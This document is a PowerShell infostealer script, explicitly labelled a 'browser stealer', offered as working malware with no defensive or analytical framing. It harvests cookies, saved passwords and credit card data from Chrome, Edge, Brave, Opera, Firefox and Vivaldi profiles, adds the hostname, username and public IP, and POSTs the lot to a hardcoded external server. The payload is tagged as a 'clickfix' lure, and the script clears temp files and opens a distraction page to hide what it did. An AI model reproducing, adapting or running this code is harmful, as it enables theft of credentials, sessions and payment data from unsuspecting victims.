# ============================================================
# BROWSER STEALER — Self-Contained (No SQLite Required)
# Steals cookies, passwords, credit cards from ALL browsers
# ============================================================

$ErrorActionPreference = "SilentlyContinue"

# ---- EDIT THIS: Your Server URL ----
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

# ---- Colors for console output ----
function Write-Color {
    param($Message, $Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

# ============================================================
# SYSTEM INFORMATION
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME
$os = (Get-WmiObject Win32_OperatingSystem).Caption

Write-Color "[+] Stealing from $pcName..." "Green"

# ---- Get IP ----
try {
    $ip = (Invoke-WebRequest -Uri "http://ip-api.com/json/" -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
} catch {
    $ip = $null
}

# ============================================================
# FILE READER HELPER (Reads files without locking)
# ============================================================

function Read-FileContent {
    param($Path)
    if (Test-Path $Path) {
        try {
            return [System.IO.File]::ReadAllBytes($Path)
        } catch {
            try {
                return [System.IO.File]::ReadAllText($Path)
            } catch {}
        }
    }
    return $null
}

# ============================================================
# COOKIE STEALER — Text extraction from cookie files
# ============================================================

function Extract-Cookies-From-Bytes {
    param($Bytes, $BrowserName)
    $cookies = @()
    if (-not $Bytes) { return $cookies }
    
    try {
        # Convert bytes to text
        $text = [System.Text.Encoding]::UTF8.GetString($Bytes)
        
        # Look for cookie patterns in the text
        # Common pattern: domain\tname\tvalue or domain name value
        $pattern = '([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})\s+([a-zA-Z0-9_-]+)\s+([^\s]+)'
        $matches = [regex]::Matches($text, $pattern)
        
        foreach ($match in $matches) {
            if ($match.Groups.Count -ge 4) {
                $domain = $match.Groups[1].Value
                $name = $match.Groups[2].Value
                $value = $match.Groups[3].Value
                
                # Skip invalid or empty values
                if ($name -and $value -and $name -notmatch '^_' -and $name -ne "host_key" -and $name -ne "name") {
                    $cookies += @{
                        domain = $domain
                        name = $name
                        value = $value
                        path = "/"
                        expires = 0
                        secure = $false
                        httponly = $false
                        browser = $BrowserName
                    }
                }
            }
        }
        
        # Also try to find cookies in the text using different pattern
        $pattern2 = '([a-zA-Z0-9_-]+)=([^;]+)'
        $matches2 = [regex]::Matches($text, $pattern2)
        foreach ($match in $matches2) {
            if ($match.Groups.Count -ge 3) {
                $name = $match.Groups[1].Value
                $value = $match.Groups[2].Value
                
                if ($name -and $value -and $name -notmatch '^_' -and $value -ne "deleted" -and $value -ne "null") {
                    # Try to find a domain in the text
                    $domain = "unknown"
                    $domainMatch = [regex]::Match($text, '([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})')
                    if ($domainMatch.Success) {
                        $domain = $domainMatch.Groups[1].Value
                    }
                    
                    $cookies += @{
                        domain = $domain
                        name = $name
                        value = $value
                        path = "/"
                        expires = 0
                        secure = $false
                        httponly = $false
                        browser = $BrowserName
                    }
                }
            }
        }
    } catch {}
    
    return $cookies
}

# ============================================================
# COOKIE STEALER — All Browsers
# ============================================================

function Get-ChromeCookies {
    $cookies = @()
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    )
    foreach ($path in $paths) {
        $bytes = Read-FileContent -Path $path
        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Chrome"
    }
    return $cookies
}

function Get-EdgeCookies {
    $cookies = @()
    $paths = @(
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
    )
    foreach ($path in $paths) {
        $bytes = Read-FileContent -Path $path
        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Edge"
    }
    return $cookies
}

function Get-BraveCookies {
    $cookies = @()
    $paths = @(
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
    )
    foreach ($path in $paths) {
        $bytes = Read-FileContent -Path $path
        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Brave"
    }
    return $cookies
}

function Get-OperaCookies {
    $cookies = @()
    $paths = @(
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Cookies"
    )
    foreach ($path in $paths) {
        $bytes = Read-FileContent -Path $path
        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Opera"
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $cookieFile = "$($profile.FullName)\cookies.sqlite"
            $bytes = Read-FileContent -Path $cookieFile
            $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Firefox"
        }
    }
    return $cookies
}

function Get-VivaldiCookies {
    $cookies = @()
    $paths = @(
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies"
    )
    foreach ($path in $paths) {
        $bytes = Read-FileContent -Path $path
        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Vivaldi"
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER — Extract from Login Data (Text-based)
# ============================================================

function Get-ChromePasswords {
    $passwords = @()
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    )
    
    foreach ($path in $paths) {
        $browser = "Chrome"
        if ($path -match "Edge") { $browser = "Edge" }
        if ($path -match "Brave") { $browser = "Brave" }
        if ($path -match "Opera") { $browser = "Opera" }
        
        $bytes = Read-FileContent -Path $path
        if ($bytes) {
            try {
                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                
                # Look for URL + username + password patterns
                $lines = $text -split "`n"
                $currentUrl = ""
                $currentUser = ""
                $currentPass = ""
                
                foreach ($line in $lines) {
                    # Find URLs
                    if ($line -match 'https?://([^/]+)') {
                        $currentUrl = $Matches[1]
                    }
                    
                    # Find usernames
                    if ($line -match 'username[_-]?value[^=]*=([^,]+)') {
                        $currentUser = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
                    }
                    
                    # Find passwords
                    if ($line -match 'password[_-]?value[^=]*=([^,]+)') {
                        $currentPass = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
                    }
                    
                    # Also look for common patterns
                    if ($line -match '"([^"]+)"\s*,\s*"([^"]+)"\s*,\s*"([^"]+)"') {
                        $currentUrl = $Matches[1] -replace 'https?://', ''
                        $currentUser = $Matches[2]
                        $currentPass = $Matches[3]
                    }
                    
                    # If we have all three, add to results
                    if ($currentUrl -and $currentUser -and $currentPass -and $currentUser -ne " " -and $currentPass -ne " " -and $currentUser -ne "username" -and $currentPass -ne "password") {
                        $passwords += @{
                            url = $currentUrl
                            username = $currentUser
                            password = $currentPass
                            browser = $browser
                        }
                        $currentUrl = ""
                        $currentUser = ""
                        $currentPass = ""
                    }
                }
                
                # Try alternative extraction method
                $pattern = 'https?://[^\s"]+'
                $urls = [regex]::Matches($text, $pattern)
                if ($urls.Count -gt 0) {
                    $url = $urls[0].Value -replace 'https?://', ''
                    $userMatch = [regex]::Match($text, 'username[^\s]+')
                    $passMatch = [regex]::Match($text, 'password[^\s]+')
                    if ($userMatch.Success -and $passMatch.Success) {
                        $user = $userMatch.Value -replace '[^a-zA-Z0-9@._-]', ''
                        $pass = $passMatch.Value -replace '[^a-zA-Z0-9@._-]', ''
                        if ($url -and $user -and $pass -and $user -ne " " -and $pass -ne " ") {
                            $passwords += @{
                                url = $url
                                username = $user
                                password = $pass
                                browser = $browser
                            }
                        }
                    }
                }
            } catch {}
        }
    }
    return $passwords
}

# ============================================================
# FIREFOX PASSWORDS
# ============================================================

function Get-FirefoxPasswords {
    $passwords = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $loginsFile = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsFile) {
                try {
                    $content = Get-Content $loginsFile -Raw
                    # Try to extract logins from JSON
                    $lines = $content -split "`n"
                    $currentUrl = ""
                    $currentUser = ""
                    $currentPass = ""
                    
                    foreach ($line in $lines) {
                        if ($line -match '"hostname"\s*:\s*"([^"]+)"') {
                            $currentUrl = $Matches[1] -replace 'https?://', ''
                        }
                        if ($line -match '"username"\s*:\s*"([^"]+)"') {
                            $currentUser = $Matches[1]
                        }
                        if ($line -match '"password"\s*:\s*"([^"]+)"') {
                            $currentPass = $Matches[1]
                            if ($currentUrl -and $currentUser -and $currentPass) {
                                $passwords += @{
                                    url = $currentUrl
                                    username = $currentUser
                                    password = $currentPass
                                    browser = "Firefox"
                                }
                                $currentUrl = ""
                                $currentUser = ""
                                $currentPass = ""
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $passwords
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-ChromeCards {
    $cards = @()
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
    )
    
    foreach ($path in $paths) {
        $browser = "Chrome"
        if ($path -match "Edge") { $browser = "Edge" }
        if ($path -match "Brave") { $browser = "Brave" }
        
        $bytes = Read-FileContent -Path $path
        if ($bytes) {
            try {
                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                
                # Look for card patterns
                $name = ""
                $number = ""
                $month = ""
                $year = ""
                
                $lines = $text -split "`n"
                foreach ($line in $lines) {
                    if ($line -match 'name[_-]?on[_-]?card[^=]*=([^,]+)') {
                        $name = $Matches[1]
                    }
                    if ($line -match 'card[_-]?number[_-]?encrypted[^=]*=([^,]+)') {
                        $number = $Matches[1]
                    }
                    if ($line -match 'expiration[_-]?month[^=]*=(\d+)') {
                        $month = $Matches[1]
                    }
                    if ($line -match 'expiration[_-]?year[^=]*=(\d+)') {
                        $year = $Matches[1]
                    }
                    
                    # Look for card number patterns in text (4-digit groups)
                    if (-not $number) {
                        $cardMatch = [regex]::Match($line, '\b(\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4})\b')
                        if ($cardMatch.Success) {
                            $number = $cardMatch.Groups[1].Value
                        }
                    }
                    
                    # If we have name and number, add to results
                    if ($name -and $number) {
                        $cards += @{
                            name = $name
                            number = $number
                            month = $month
                            year = $year
                            browser = $browser
                        }
                        $name = ""
                        $number = ""
                        $month = ""
                        $year = ""
                    }
                }
                
                # Try alternative: find patterns like "John Doe 4111-1111-1111-1111 12/25"
                $pattern = '([A-Za-z\s]+)\s+(\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4})\s+(\d{2})[/](\d{2})'
                $matches = [regex]::Matches($text, $pattern)
                foreach ($match in $matches) {
                    if ($match.Groups.Count -ge 5) {
                        $cards += @{
                            name = $match.Groups[1].Value.Trim()
                            number = $match.Groups[2].Value
                            month = $match.Groups[3].Value
                            year = $match.Groups[4].Value
                            browser = $browser
                        }
                    }
                }
            } catch {}
        }
    }
    return $cards
}

# ============================================================
# MAIN EXECUTION
# ============================================================

Write-Color "[+] Stealing from ALL browsers..." "Green"

# ---- Cookies ----
$allCookies = @()
Write-Color "[+] Getting Chrome cookies..." "Cyan"
$allCookies += Get-ChromeCookies
Write-Color "[+] Getting Edge cookies..." "Cyan"
$allCookies += Get-EdgeCookies
Write-Color "[+] Getting Brave cookies..." "Cyan"
$allCookies += Get-BraveCookies
Write-Color "[+] Getting Opera cookies..." "Cyan"
$allCookies += Get-OperaCookies
Write-Color "[+] Getting Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies
Write-Color "[+] Getting Vivaldi cookies..." "Cyan"
$allCookies += Get-VivaldiCookies

# ---- Passwords ----
$allPasswords = @()
Write-Color "[+] Getting Chrome/Edge/Brave passwords..." "Cyan"
$allPasswords += Get-ChromePasswords
Write-Color "[+] Getting Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

# ---- Credit Cards ----
$allCards = @()
Write-Color "[+] Getting Chrome/Edge/Brave credit cards..." "Cyan"
$allCards += Get-ChromeCards

Write-Color "[+] Cookies: $($allCookies.Count)" "Yellow"
Write-Color "[+] Passwords: $($allPasswords.Count)" "Yellow"
Write-Color "[+] Credit Cards: $($allCards.Count)" "Yellow"

# ---- Build payload ----
$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
        os = $os
        ip = $ip
    }
    fingerprint = @{
        userAgent = "PowerShell Payload (Windows)"
        hostname = $pcName
        browser = "PowerShell"
        screen = "N/A"
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ---- Send to server ----
Write-Color "[+] Sending data to server..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

# ---- Cleanup ----
$tempFiles = Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue
foreach ($file in $tempFiles) {
    try { Remove-Item $file.FullName -Force } catch {}
}

# ---- Distraction ----
Write-Color "[+] Opening distraction page..." "Cyan"
Start-Process "https://www.google.com"

Write-Color "[+] Done!" "Green"
